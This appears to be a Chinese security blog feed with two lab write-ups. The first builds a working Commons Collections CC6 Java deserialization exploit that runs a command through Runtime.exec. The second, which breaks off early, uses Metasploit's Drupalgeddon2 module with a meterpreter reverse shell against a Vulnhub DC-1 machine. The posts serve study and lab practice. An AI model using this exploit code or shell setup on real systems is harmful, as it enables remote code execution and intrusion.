      <link href="/undefined/29590.html"/>
      <url>/undefined/29590.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>基本上和CC1差不多</p><blockquote><p>jdk8u71<br>Comoons-Collections 3.2.1</p></blockquote><h2 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h2><p>前半段链子，<code>LazyMap</code> 类到 <code>InvokerTransformer</code> 类是一样的，所以直接到 <code>LazyMap</code> 下，这里先重新一边LazyMap 类调用计算器的 EXP，看参考博客说多写有利于比那些EXP确实是这样，能加深理解，反正没坏处，并且我发现自己又有点忘记了。。。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> LazyMap.decorate(hashMap, invokerTransformer);  </span><br><span class="line">        Class&lt;LazyMap&gt; mapClass = LazyMap.class;  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">classDeclaredMethod</span> <span class="operator">=</span> mapClass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>, Object.class);  </span><br><span class="line">        classDeclaredMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        classDeclaredMethod.invoke(map,r);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里下一步就是继续找哪里调用了get方法，看了利用链，下一个类和方法是<code>TiedMapEntry</code> 类中的 <code>getValue()</code>方法，这个里面调用了 <code>LazyMap</code> 的 <code>get()</code> 方法，然后继续编写EXP确保目前链子可用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  </span><br><span class="line">        <span class="comment">//传入LazyMap就和后面连起来了，即调用的是LazyMap的get方法  </span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);  </span><br><span class="line">        tiedMapEntry.getValue();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弹出成功<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071430104.png" alt="image-20230507143003991"><br>然后就是继续往上找，看谁调用了 <code>TiedMapEntry</code> 中的 <code>getValue()</code> 方法，这个方法比较常见，所以就是先看同类下有没有调用，最后发现同类下的hashCode方法调用了<code>getValue()</code> 方法<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071430087.png" alt="image-20230507143025027"><br>而找到hashCode方法后就是找谁调用了hashCode方法，但是这里我们不用继续找了，因为在Java反序列化中hashCode方法后面的利用链基本都是下面这条</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxx.readObject()</span><br><span class="line">HashMap.put() --自动调用--&gt;   HashMap.hash()</span><br><span class="line">后续利用链.hashCode()</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071430291.png" alt="image-20230507143036238"><br>然后利用hash方法写exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  </span><br><span class="line">        <span class="comment">//传入LazyMap就和后面连起来了，即调用的是LazyMap的get方法  </span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//put方法里面会调用hash方法  </span></span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;value&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后看一下现在的EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  </span><br><span class="line">        <span class="comment">//传入LazyMap就和后面连起来了，即调用的是LazyMap的get方法  </span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//put方法里面会调用hash方法  </span></span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);  </span><br><span class="line">        serialize(expMap);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在注释掉反序列化后还是能弹出计算器，这肯定是有问题的，这里和URLDNS的思想其实差不多，在执行 <code>put()</code> 方法的时候，里面也会执行hash方法但是要的是readObject里面的putVal中调用的hash方法，所以我们只需要修改下面这条语句的参数即</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chainedTransformer);</span><br></pre></td></tr></table></figure><p>我们先在序列化的时候传进去一个没用的参数，然后反序列化的时候再重新赋值就行，改为下面这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,<span class="keyword">new</span>  <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>put完之后通过反射再改回来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;  </span><br><span class="line"><span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line">factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">factoryField.set(lazyMap,chainedTransformer);</span><br></pre></td></tr></table></figure><p>但是改完之后反序列化也不弹计算器了，下个断点调试一下<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071430225.png" alt="image-20230507143052175"><br>最终问题出在LazyMap下的get方法<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071431873.png" alt="image-20230507143107809"><br>put的时候会传入一个key反序列化无法进入if执行transform方法，所以需要删掉这个key</p><h2 id="最终EXP"><a href="#最终EXP" class="headerlink" title="最终EXP"></a>最终EXP</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,<span class="keyword">new</span>  <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));  </span><br><span class="line">        <span class="comment">//传入LazyMap就和后面连起来了，即调用的是LazyMap的get方法  </span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//put方法里面会调用hash方法，但是我们要的是putVal里面的hash方法对key进行计算  </span></span><br><span class="line">        <span class="comment">//所以就需要通过反射对put改值，让他不触发这条链  </span></span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);  </span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        serialize(expMap);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071431402.png" alt="image-20230507143122325"><br>这里还有一个点就是idea的设置问题，在 IDEA 进行 debug 调试的时候，为了展示对象的集合，会自动调用 <code>toString()</code> 方法，所以在创建 <code>TiedMapEntry</code> 的时候，就自动调用了 <code>getValue()</code> 最终将链子走完，然后弹出计算器，所以需要进行如下修改<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071431521.png" alt="image-20230507143138470"><br>设置成这样就行</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xxx.readObject()</span><br><span class="line">HashMap.put()</span><br><span class="line">HashMap.hash()</span><br><span class="line">TiedMapEntry.hashCode()</span><br><span class="line">TiedMapEntry.getValue()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071431635.png" alt="image-20230507143149592"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这条链子参考博客跟到一半搞不懂了然后去看白日梦组长的视频又理了一下才完成这条链子，不得不说白日梦组长讲的确实细</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub--DC-1</title>
      <link href="/undefined/15359.html"/>
      <url>/undefined/15359.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p><a href="https://www.vulnhub.com/entry/dc-1,292/">官网直接下载zip</a></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>首先扫描一下主机存活看一下靶机IP，可以使用如下命令<br><code>arp-scan -l</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031332767.png" alt="image-20230503133212652"><br>最后确定靶机IP为192.168.75.133可以一个个访问确定，也可以看一下靶机的mac地址确定<br>访问得到如下页面<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031332069.png"><br>这个Drupal有个远程代码执行的cve为CVE-2018-7600，当然还不知道版本对不对，不过先不急着看这个CVE，用nmap扫描一下开放的端口<br><code>nmap -A 192.168.75.133</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031332578.png" alt="image-20230503133247513"><br>利用插件看一下指纹信息，可以看到Drupal版本为7是存在这个CVE漏洞的<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031332162.png" alt="image-20230503133258116"></p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>直接利用msfconsole来看一下，这里手动弄的话很麻烦，进入msf搜一下这个模块<br><code>search Drupal</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031333978.png" alt="image-20230503133311896"><br>直接使用18年的那个CVE<code>use exploit/unix/webapp/drupal_drupalgeddon2</code>然后查看一下payload执行<code>show payloads</code>可以看到所有payload列出，使用如下payload，这里也可以不设置，我是为了练习一下工具使用<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031333921.png" alt="image-20230503133321883"><br><code>set payload php/meterpreter/reverse_tcp</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031333997.png" alt="image-20230503133330955"><br>然后查看需要配置的参数<br><code>show options</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031333547.png" alt="image-20230503133344476"><br>yes为必填参数，有默认的直接用，这里就只需要配一下RHOSTS即靶机IP<br><code>set rhosts 192.168.75.133</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334617.png" alt="image-20230503133401577"><br>然后开始攻击<code>exploit</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334085.png" alt="image-20230503133412030"><br>攻击成功，拿shell<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334632.png" alt="image-20230503133423597"><br>ls看到flag1先打开看看<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334177.png" alt="image-20230503133433140"></p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>用python获取交互式shell<br><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><img 